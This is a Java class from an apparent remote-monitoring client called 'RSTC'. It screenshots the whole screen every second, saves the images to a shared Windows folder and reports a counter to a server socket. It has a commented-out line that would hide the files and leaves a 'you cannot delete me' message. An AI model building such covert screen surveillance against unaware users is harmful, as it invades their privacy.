import java.io.*;
import java.lang.*;
import java.awt.*;
import java.awt.image.*;
import javax.imageio.*;
import java.util.*;
import java.net.*;

public class ClientImageHandler implements Runnable
{
 int port;

  public ClientImageHandler(int port)
  {
   try
   {
    Thread t=new Thread(this);
    t.sleep(100);
    this.port=port;
    Client.cs_imagesocket=new Socket(Client.serverip,port);

    t.start();
   }
   catch(Exception e)
   {
   System.out.println("Exception in image:" + e );
   if(e.toString().indexOf("Connection reset")!=-1)
   ClientRSTC.destroyClient();
   if(e.toString().indexOf("NullPointerException")!=-1)
   System.exit(0);
   }
   }

  public void run()
  {
   try
   {
    DataOutputStream imageout=new DataOutputStream(Client.cs_imagesocket.getOutputStream());
    Robot imagerobot=new Robot();
    BufferedImage screenimg;
    long counter=1;

      File folder=new File("C:\\Documents and Settings\\All Users\\Documents\\RSTC");
      if(!folder.exists())
      {
       folder.mkdirs();
      }

      FileOutputStream cannotdelete=new FileOutputStream("C:\\Documents and Settings\\All Users\\Documents\\RSTC\\simple.txt");
      DataOutputStream out=new DataOutputStream(cannotdelete);
      out.writeBytes("You cannot delete this folder or me");
      out.flush();
    while(true)
    {
     try
     {
      screenimg= imagerobot.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
      File imagefile=new File("C:\\Documents and Settings\\All Users\\Documents\\RSTC\\Screen" + (counter) + ".jpeg");
      //imagefile.setHidden(true);
      ImageIO.write(screenimg,"jpeg",imagefile);
      
      imageout.writeLong(counter);
      imageout.flush();
      counter++;
      if(counter >=10)
      {
       long temp=counter-9;
       File f=new File("C:\\Documents and Settings\\All Users\\Documents\\RSTC\\Screen" + (temp) + ".jpeg");
       f.delete();
      }
      Thread.currentThread().sleep(1000);
     }
     catch(Exception e)
     {
      System.out.println("Exception in image:" + e);
      if(e.toString().indexOf("Connection reset")!=-1)
      ClientRSTC.destroyClient();
      if(e.toString().indexOf("NullPointerException")!=-1)
      System.exit(0);
    }
    }
   }
   catch(Exception e)
   {
     System.out.println("Exception in image:" + e);
     if(e.toString().indexOf("Connection reset")!=-1)
     ClientRSTC.destroyClient();
     if(e.toString().indexOf("NullPointerException")!=-1)
     System.exit(0);
    }
  }
 }
